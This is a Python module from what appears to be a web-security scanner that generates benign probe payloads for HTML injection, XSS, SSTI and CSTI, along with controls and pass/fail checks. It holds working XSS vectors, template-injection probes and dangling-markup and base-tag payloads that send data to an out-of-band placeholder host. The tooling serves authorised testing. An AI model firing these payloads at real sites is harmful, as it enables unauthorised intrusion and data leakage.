"""Markup and template injection generators: htmli, htmli_stored, xss_reflected,
xss_stored, xss_dom, ssti, csti.

All payloads are non-destructive and prove only reflection / rendering /
harmless evaluation. XSS classes prove script EXECUTION via the private headless
browser (route browser), surfacing a per-case token through console.log or
document.title; a raw reflection alone is a signal for the sibling htmli cell,
never a positive for an xss cell. Template payloads stop at arithmetic and
engine identification: no command execution, no sandbox-escape gadgets.
"""

from __future__ import annotations

from .base import Ctx, TestCase

GENERATORS: dict = {}


def _gen(name):
    def deco(fn):
        GENERATORS[name] = fn
        return fn
    return deco


def _stored_counter(ctx: Ctx, principal: str | None) -> dict:
    """counter_read spec that fetches the render endpoint as the viewer."""
    render = ctx.extra.get("render_endpoint", "GET /")
    method, _, path = render.partition(" ")
    viewer = ctx.extra.get("viewer") or ctx.other_principal or "B"
    return {"method": method or "GET", "path": path or "/", "principal": viewer}


# ---------------------------------------------------------------------------- HTML injection

def _htmli_cases(ctx: Ctx, cls: str, stored: bool) -> list[TestCase]:
    contexts = set(ctx.contexts) or {"html_text"}
    principal = ctx.acting_principal if stored else None
    viewer = ctx.extra.get("viewer") or ctx.other_principal or "B"
    route = "counter_read" if stored else "sender"

    def positive(tok, needle):
        # the raw markup (with the unique token inside) must survive un-encoded
        if stored:
            return {"type": "counter_read_contains", "value": needle}
        return {"type": "all", "of": [
            {"type": "body_contains", "value": needle},
            {"type": "body_not_contains", "value": needle.replace("<", "&lt;").replace(">", "&gt;")},
        ]}

    def mk(no, family, variant, payload, needle, rung, negative, extra_ctx=False):
        extra = {}
        muts = [{"op": "set_input", "value": payload, "raw": True}]
        if stored:
            extra = {"counter_read": _stored_counter(ctx, viewer), "stores_token": needle}
        return TestCase(case_no=no, technique=f"{cls}.{family}.{variant}", payload=payload,
                        mutation=muts, positive=positive(0, needle), negative=negative, route=route,
                        principal=principal, needs_counter_read=stored, rung=rung, extra=extra,
                        description=f"{'stored ' if stored else ''}HTML injection, {family}")

    cases: list[TestCase] = []
    # control: a benign canary reflects where expected (proves the harness sees the render)
    ctrl_tok = ctx.token("ctrl")
    if stored:
        cases.append(TestCase(case_no=0, technique=f"{cls}.control.canary", payload=ctrl_tok,
                              mutation=[{"op": "set_input", "value": ctrl_tok}], is_control=True,
                              positive={"type": "counter_read_contains", "value": ctrl_tok},
                              negative="the canary never appears on the render page", route="counter_read",
                              principal=principal, needs_counter_read=True,
                              extra={"counter_read": _stored_counter(ctx, viewer), "stores_token": ctrl_tok},
                              description="control: a benign value stores and renders to the viewer"))
    else:
        cases.append(TestCase(case_no=0, technique=f"{cls}.control.canary", payload=ctrl_tok,
                              mutation=[{"op": "set_input", "value": ctrl_tok}], is_control=True,
                              positive={"type": "body_contains", "value": ctrl_tok},
                              negative="the canary does not reflect", route="sender",
                              description="control: a benign value reflects in the response"))

    n = 1
    t = lambda: ctx.token(n)
    # text-context tag renders
    for family, variant, tmpl, rung in [
        ("tag", "bold", "<b>{t}</b>", "tag_renders"),
        ("tag", "italic_attr", '<i data-m="{t}">x</i>', "tag_renders"),
        ("tag", "heading", "<h1>{t}</h1>", "tag_renders"),
        ("tag", "svg", "<svg><title>{t}</title></svg>", "tag_renders"),
        ("tag", "table", "<table><tr><td>{t}</td></tr></table>", "tag_renders"),
    ]:
        tok = t()
        payload = tmpl.format(t=tok)
        cases.append(mk(n, family, variant, payload, payload, rung,
                        f"the {variant} tag is HTML-encoded (&lt;{variant}&gt; or entity form) or stripped"))
        n += 1
    # attribute breakouts (always tried: a value shown in text here may land in an attribute elsewhere)
    for variant, tmpl in [("quote_img", '"><img src=x data-m={t}>'), ("single_quote", "'><b>{t}</b>")]:
        tok = t()
        payload = tmpl.format(t=tok)
        cases.append(mk(n, "attr", variant, payload, payload.split(">", 1)[1], "tag_renders",
                        "the breakout quote and bracket are encoded, so the value stays inside the attribute"))
        n += 1
    # closing-context breakouts
    for variant, tmpl in [("textarea", "</textarea><b>{t}</b>"), ("title", "</title><b>{t}</b>"),
                          ("comment", "--><b>{t}</b><!--"), ("script_close", "</script><b>{t}</b>")]:
        tok = t()
        payload = tmpl.format(t=tok)
        cases.append(mk(n, "breakout", variant, payload, f"<b>{tok}</b>", "tag_renders",
                        f"the closing {variant} sequence is encoded, so no new tag is created"))
        n += 1
    # encodings of a plain tag (the server must not decode-then-render)
    tag_tok = t()
    for variant, enc in [("url", f"%3Cb%3E{tag_tok}%3C/b%3E"), ("double_url", f"%253Cb%253E{tag_tok}")]:
        cases.append(mk(n, "encoding", variant, enc, f"<b>{tag_tok}" if variant == "url" else tag_tok, "raw_angle_brackets",
                        f"the {variant}-encoded markup is shown literally, not decoded into a tag", ))
        n += 1
    # dangling markup to an attacker URL (works even under a strict script CSP)
    dtok = t()
    cases.append(TestCase(case_no=n, technique=f"{cls}.dangling.img", payload=f"<img src='{{{{OOB}}}}?{dtok}",
                          mutation=[{"op": "set_input", "value": f"<img src='{{{{OOB}}}}?{dtok}", "raw": True}],
                          positive={"type": "oob_hit"}, negative="no OOB request arrives, so the unterminated markup did not reach an attacker URL",
                          route="oob", rung="dangling_markup", principal=principal,
                          description="dangling markup: an unterminated attribute leaks following bytes to an attacker URL"))
    n += 1
    # a second dangling form-action variant
    cases.append(TestCase(case_no=n, technique=f"{cls}.dangling.form", payload=f"<form action='{{{{OOB}}}}?{ctx.token('f')}'><button>x",
                          mutation=[{"op": "set_input", "value": f"<form action='{{{{OOB}}}}?{ctx.token('f')}'>", "raw": True}],
                          positive={"type": "oob_hit"}, negative="no OOB request arrives from the injected form",
                          route="oob", rung="dangling_markup", principal=principal,
                          description="dangling markup: injected form posts to an attacker URL"))
    n += 1
    # location variant: same payload moved to another accepted location
    if ctx.input_location and ctx.input_location != "json":
        move_tok = t()
        payload = f"<b>{move_tok}</b>"
        to = "json" if ctx.body_kind == "json" else ("form" if ctx.method != "GET" else "query")
        if to != ctx.input_location:
            muts = [{"op": "move_input", "to": to, "value": payload}]
            if stored:
                cases.append(TestCase(case_no=n, technique=f"{cls}.location.{to}", payload=payload, mutation=muts,
                                      positive={"type": "counter_read_contains", "value": payload}, negative="the value in the alternate location is encoded",
                                      route="counter_read", principal=principal, needs_counter_read=True, rung="tag_renders",
                                      extra={"counter_read": _stored_counter(ctx, viewer)}))
            else:
                cases.append(TestCase(case_no=n, technique=f"{cls}.location.{to}", payload=payload, mutation=muts,
                                      positive={"type": "all", "of": [{"type": "body_contains", "value": payload},
                                                                      {"type": "body_not_contains", "value": "&lt;b&gt;"}]},
                                      negative="the value in the alternate location is encoded", rung="tag_renders"))
            n += 1
    return cases


@_gen("htmli")
def gen_htmli(ctx: Ctx) -> list[TestCase]:
    return _htmli_cases(ctx, "htmli", stored=False)


@_gen("htmli_stored")
def gen_htmli_stored(ctx: Ctx) -> list[TestCase]:
    return _htmli_cases(ctx, "htmli_stored", stored=True)


# ---------------------------------------------------------------------------- XSS (script execution)

def _xss_cases(ctx: Ctx, cls: str, stored: bool) -> list[TestCase]:
    contexts = set(ctx.contexts) or {"html_text"}
    principal = ctx.acting_principal if stored else None
    viewer = ctx.extra.get("viewer") or ctx.other_principal or "B"

    def browser_open(payload_token):
        if stored:
            render = ctx.extra.get("render_endpoint", "GET /")
            _, _, path = render.partition(" ")
            return {"open": "path", "path": path or "/", "principal": viewer, "wait_ms": 1500}
        return {"open": "request", "wait_ms": 1500}

    def mk(no, family, variant, payload, rung, negative, precheck_needle=None, js_context=False):
        tok_in_payload = payload
        extra = {"browser": browser_open(payload)}
        # only open a browser when the raw payload actually reflects (sender precheck)
        if precheck_needle:
            extra["browser"]["precheck"] = {"type": "body_contains", "value": precheck_needle}
        muts = [{"op": "set_input", "value": payload, "raw": True}]
        if stored:
            extra["counter_read"] = _stored_counter(ctx, viewer)
        marker = _marker_token(payload)
        return TestCase(case_no=no, technique=f"{cls}.{family}.{variant}", payload=payload, mutation=muts,
                        positive={"type": "browser_marker", "token": marker},
                        negative=negative, route="browser", principal=principal, needs_counter_read=False,
                        rung=rung, extra=extra, description=f"{'stored ' if stored else ''}XSS, {family}")

    cases: list[TestCase] = []
    ctrl = ctx.token("ctrl")
    if stored:
        cases.append(TestCase(case_no=0, technique=f"{cls}.control.canary", payload=ctrl,
                              mutation=[{"op": "set_input", "value": ctrl}], is_control=True,
                              positive={"type": "counter_read_contains", "value": ctrl}, needs_counter_read=True,
                              route="counter_read", principal=principal, extra={"counter_read": _stored_counter(ctx, viewer)},
                              negative="the stored canary never reaches the viewer's page",
                              description="control: a benign value stores and renders to the viewer"))
    else:
        cases.append(TestCase(case_no=0, technique=f"{cls}.control.canary", payload=ctrl,
                              mutation=[{"op": "set_input", "value": ctrl}], is_control=True,
                              positive={"type": "body_contains", "value": ctrl},
                              negative="the canary does not reflect at all", route="sender",
                              description="control: a benign value reflects"))
    n = 1

    def mkpayload(kind, marker):
        return {
            "script": f"<script>document.title={marker!r}</script>",
            "img": f"<img src=x onerror=document.title={marker!r}>",
            "svg": f"<svg onload=document.title={marker!r}>",
            "body": f"<body onload=document.title={marker!r}>",
            "details": f"<details open ontoggle=document.title={marker!r}>",
            "iframe_srcdoc": f"<iframe srcdoc=\"&lt;script&gt;parent.document.title={marker!r}&lt;/script&gt;\"></iframe>",
        }[kind]

    for family, variant, kind, rung in [
        ("html", "script", "script", "script_executes"),
        ("html", "img_onerror", "img", "script_executes"),
        ("html", "svg_onload", "svg", "script_executes"),
        ("html", "body_onload", "body", "script_executes"),
        ("html", "details_ontoggle", "details", "script_executes"),
    ]:
        marker = ctx.token(n)
        payload = mkpayload(kind, marker)
        cases.append(mk(n, family, variant, payload, rung,
                        f"the {variant} vector does not execute (encoded, stripped, or blocked by CSP)",
                        precheck_needle=marker))
        n += 1
    # attribute breakout (always tried)
    marker = ctx.token(n)
    payload = f'"><img src=x onerror=document.title={marker!r}>'
    cases.append(mk(n, "attr", "breakout_img", payload, "script_executes",
                    "the attribute breakout is encoded, so no handler fires", precheck_needle=marker))
    n += 1
    marker = ctx.token(n)
    payload = f'" onmouseover=document.title={marker!r} autofocus tabindex=0 x="'
    cases.append(mk(n, "attr", "event_handler", payload, "script_executes",
                    "the injected event-handler attribute is not honoured", precheck_needle=marker))
    n += 1
    # JS string / block breakout (always tried: a reflection may land in a script elsewhere)
    marker = ctx.token(n)
    payload = f"';document.title={marker!r};//"
    cases.append(mk(n, "js", "string_break_single", payload, "script_executes",
                    "the quote is escaped, so the JS string is not broken", precheck_needle=marker))
    n += 1
    marker = ctx.token(n)
    payload = f'";document.title={marker!r};//'
    cases.append(mk(n, "js", "string_break_double", payload, "script_executes",
                    "the double quote is escaped", precheck_needle=marker))
    n += 1
    marker = ctx.token(n)
    payload = f"</script><script>document.title={marker!r}</script>"
    cases.append(mk(n, "js", "script_close", payload, "script_executes",
                    "the closing script tag is encoded", precheck_needle=marker))
    n += 1
    # encoding family: the server must not decode-then-render an escaped vector
    marker = ctx.token(n)
    payload = f"%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%27{marker}%27%3E"
    cases.append(mk(n, "encoding", "url_img", payload, "script_executes",
                    "the URL-encoded vector is shown literally, not decoded into a tag", precheck_needle=marker))
    n += 1
    # javascript: URL in a url-valued context (synthetic clicks do not fire these; browser auto-nav may)
    if "url" in contexts:
        marker = ctx.token(n)
        payload = f"javascript:document.title={marker!r}"
        cases.append(TestCase(case_no=n, technique=f"{cls}.scheme.javascript", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": True}],
                              positive={"type": "manual", "describe": "a human clicks the injected link; synthetic clicks never fire javascript: URLs"},
                              negative="the href is not a javascript: URL in the rendered page", route="browser",
                              principal=principal, rung="script_executes", extra={"browser": browser_open(payload)},
                              description="javascript: URL in a url-valued attribute (needs a human click)"))
        n += 1
    # CSP-aware: when a strict script CSP is present, note that execution needs a gadget
    if ctx.csp and "script-src" in (ctx.csp or ""):
        marker = ctx.token(n)
        payload = f"<base href='{{{{OOB}}}}'>"
        cases.append(TestCase(case_no=n, technique=f"{cls}.csp.base_tag", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": True}],
                              positive={"type": "oob_hit"},
                              negative="the base tag does not redirect a same-origin script fetch to the attacker",
                              route="oob", principal=principal, rung="script_executes",
                              description="under a strict CSP, a <base> tag tries to hijack a relative script src"))
        n += 1
    # polyglot for robustness
    marker = ctx.token("poly")
    payload = f"\"'><img src=x onerror=document.title={marker!r}><svg onload=document.title={marker!r}>"
    cases.append(mk(n, "polyglot", "multi", payload, "script_executes",
                    "the polyglot does not execute in any context", precheck_needle=marker))
    n += 1
    return cases


def _marker_token(payload: str) -> str:
    import re

    m = re.search(r"document\.title=['\"]([a-z0-9]+)['\"]", payload)
    if m:
        return m.group(1)
    m = re.search(r"[?&]([a-z0-9]{6,})", payload)
    return m.group(1) if m else payload


@_gen("xss_reflected")
def gen_xss_reflected(ctx: Ctx) -> list[TestCase]:
    return _xss_cases(ctx, "xss_reflected", stored=False)


@_gen("xss_stored")
def gen_xss_stored(ctx: Ctx) -> list[TestCase]:
    return _xss_cases(ctx, "xss_stored", stored=True)


@_gen("xss_dom")
def gen_xss_dom(ctx: Ctx) -> list[TestCase]:
    source = ctx.extra.get("source", "location.hash")
    page = ctx.extra.get("page", "/")
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="xss_dom.control.load", payload="(page loads)",
                          mutation=[], is_control=True, route="browser",
                          positive={"type": "browser_text_contains", "value": ""},
                          negative="the page does not load in the private browser",
                          extra={"browser": {"open": "path", "path": page, "wait_ms": 1000}},
                          description="control: the DOM page loads so a sink can be reached"))
    where = "fragment" if "hash" in source else ("query" if "search" in source else "fragment")
    n = 1
    for family, variant, tmpl in [
        ("sink", "img_onerror", "<img src=x onerror=document.title={m}>"),
        ("sink", "svg_onload", "<svg onload=document.title={m}>"),
        ("sink", "iframe", "<iframe src=javascript:document.title={m}></iframe>"),
        ("sink", "script_src", "<script>document.title={m}</script>"),
        ("proto", "js_uri", "javascript:document.title={m}"),
        ("proto", "data_uri", "data:text/html,<script>top.document.title={m}</script>"),
    ]:
        marker = ctx.token(n)
        payload = tmpl.format(m=repr(marker))
        cases.append(TestCase(case_no=n, technique=f"xss_dom.{family}.{variant}", payload=payload,
                              mutation=[], route="browser",
                              positive={"type": "browser_marker", "token": marker},
                              negative=f"the {variant} payload in {source} does not reach the {ctx.extra.get('sink','sink')} sink",
                              rung="script_executes",
                              extra={"browser": {"open": "path", "path": page, "wait_ms": 1500, where: payload, "source": source}},
                              description=f"DOM XSS: {source} -> {ctx.extra.get('sink','sink')}"))
        n += 1
    # encoded variants to defeat a naive filter on the source
    for variant, enc in [("url_encoded", "%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D'{m}'%3E"),
                        ("mixed_case", "<ImG src=x OnErRoR=document.title='{m}'>")]:
        marker = ctx.token(n)
        payload = enc.replace("{m}", marker)
        cases.append(TestCase(case_no=n, technique=f"xss_dom.encoding.{variant}", payload=payload,
                              mutation=[], route="browser", positive={"type": "browser_marker", "token": marker},
                              negative=f"the {variant} payload does not execute at the sink", rung="script_executes",
                              extra={"browser": {"open": "path", "path": page, "wait_ms": 1500, where: payload, "source": source}}))
        n += 1
    # attribute-sink and markup-mutation families
    for family, variant, tmpl in [
        ("attr", "a_href_js", "<a href=javascript:document.title='{m}' id=x>x</a>"),
        ("attr", "form_action", "<form action=javascript:document.title='{m}'><button id=b>x</button></form>"),
        ("mutation", "noscript", "<noscript><p id=x></noscript><img src=x onerror=document.title='{m}'>"),
    ]:
        marker = ctx.token(n)
        payload = tmpl.replace("{m}", marker)
        cases.append(TestCase(case_no=n, technique=f"xss_dom.{family}.{variant}", payload=payload,
                              mutation=[], route="browser", positive={"type": "browser_marker", "token": marker},
                              negative=f"the {variant} payload does not reach the sink", rung="script_executes",
                              extra={"browser": {"open": "path", "path": page, "wait_ms": 1500, where: payload, "source": source}}))
        n += 1
    return cases


# ---------------------------------------------------------------------------- SSTI / CSTI

@_gen("ssti")
def gen_ssti(ctx: Ctx) -> list[TestCase]:
    a = ctx.number("a", 7000, 9000)
    b = ctx.number("b", 11, 97)
    product = a * b
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="ssti.control.literal", payload=str(product),
                          mutation=[{"op": "set_input", "value": str(product)}], is_control=True,
                          positive={"type": "body_contains", "value": str(product)},
                          negative="the literal number does not reflect, so no evaluation can be read",
                          description="control: the literal product reflects (so arithmetic is distinguishable from reflection)"))
    # Each engine: the expression must NOT be what the literal control shows; a positive is the
    # product appearing WITHOUT the raw expression, so plain reflection never counts.
    engines = [
        ("jinja", "arith", "{{%d*%d}}" % (a, b), "arithmetic_evaluates"),
        ("jinja", "string_mult", "{{7*'7'}}", "engine_identified"),   # Jinja -> 7777777, Twig -> 49
        ("twig", "arith", "{{%d*%d}}" % (a, b), "arithmetic_evaluates"),
        ("freemarker", "arith", "${%d*%d}" % (a, b), "arithmetic_evaluates"),
        ("velocity", "arith", "#set($x=%d*%d)$x" % (a, b), "arithmetic_evaluates"),
        ("erb", "arith", "<%%= %d*%d %%>" % (a, b), "arithmetic_evaluates"),
        ("thymeleaf", "arith", "[[${%d*%d}]]" % (a, b), "arithmetic_evaluates"),
        ("smarty", "arith", "{%d*%d}" % (a, b), "arithmetic_evaluates"),
        ("mako", "arith", "${%d*%d}" % (a, b), "arithmetic_evaluates"),
        ("razor", "arith", "@(%d*%d)" % (a, b), "arithmetic_evaluates"),
        ("handlebars", "helper", "{{#with %d}}{{this}}{{/with}}" % product, "engine_identified"),
    ]
    n = 1
    for engine, variant, payload, rung in engines:
        needle = "7777777" if variant == "string_mult" else str(product)
        if variant == "helper":
            needle = str(product)
        cases.append(TestCase(case_no=n, technique=f"ssti.{engine}.{variant}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": True}],
                              positive={"type": "all", "of": [{"type": "body_contains", "value": needle},
                                                             {"type": "body_not_contains", "value": payload}]},
                              negative=f"the {engine} expression is shown literally or stripped, so it is not evaluated",
                              rung=rung, description=f"SSTI probe for {engine}"))
        n += 1
    # location variant
    if ctx.input_location and ctx.input_location != "query":
        payload = "{{%d*%d}}" % (a, b)
        cases.append(TestCase(case_no=n, technique="ssti.jinja.location_query", payload=payload,
                              mutation=[{"op": "move_input", "to": "query", "value": payload}],
                              positive={"type": "all", "of": [{"type": "body_contains", "value": str(product)},
                                                             {"type": "body_not_contains", "value": payload}]},
                              negative="the expression in the query string is not evaluated", rung="arithmetic_evaluates"))
        n += 1
    return cases


@_gen("csti")
def gen_csti(ctx: Ctx) -> list[TestCase]:
    a = ctx.number("a", 7000, 9000)
    b = ctx.number("b", 11, 97)
    product = a * b
    page_open = {"open": "request", "wait_ms": 1200}
    cases: list[TestCase] = []
    cases.append(TestCase(case_no=0, technique="csti.control.literal", payload=str(product),
                          mutation=[{"op": "set_input", "value": str(product)}], is_control=True, route="browser",
                          positive={"type": "browser_text_contains", "value": str(product)},
                          negative="the literal number does not render in the browser",
                          extra={"browser": dict(page_open)},
                          description="control: the literal product renders in the browser DOM"))
    n = 1
    for engine, variant, payload in [
        ("angular", "arith", "{{%d*%d}}" % (a, b)),
        ("angular", "arith_spaced", "{{ %d * %d }}" % (a, b)),
        ("vue", "arith", "{{%d*%d}}" % (a, b)),
        ("vue", "mustache_attr", "{{%d*%d}}" % (a, b)),
        ("alpine", "arith", "{{%d*%d}}" % (a, b)),
        ("angularjs", "brackets", "{{[].constructor}}".replace("[].constructor", "%d*%d" % (a, b))),
    ]:
        cases.append(TestCase(case_no=n, technique=f"csti.{engine}.{variant}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": True}], route="browser",
                              positive={"type": "all", "of": [{"type": "browser_text_contains", "value": str(product)}]},
                              negative=f"the {engine} expression renders literally (no client evaluation)",
                              rung="expression_evaluates" if "arith" in variant else "framework_identified",
                              extra={"browser": dict(page_open, precheck={"type": "body_contains", "value": payload})},
                              description=f"CSTI probe for {engine}"))
        n += 1
    # a few encoding / attribute variants for breadth
    for variant, payload in [("entity", "&#123;&#123;%d*%d&#125;&#125;" % (a, b)),
                            ("attr", "x{{%d*%d}}x" % (a, b)),
                            ("ng_bind", "<span ng-bind='%d*%d'></span>" % (a, b)),
                            ("v_text", "<span v-text='%d*%d'></span>" % (a, b))]:
        cases.append(TestCase(case_no=n, technique=f"csti.render.{variant}", payload=payload,
                              mutation=[{"op": "set_input", "value": payload, "raw": True}], route="browser",
                              positive={"type": "browser_text_contains", "value": str(product)},
                              negative=f"the {variant} form does not evaluate client-side", rung="expression_evaluates",
                              extra={"browser": dict(page_open)}))
        n += 1
    return cases
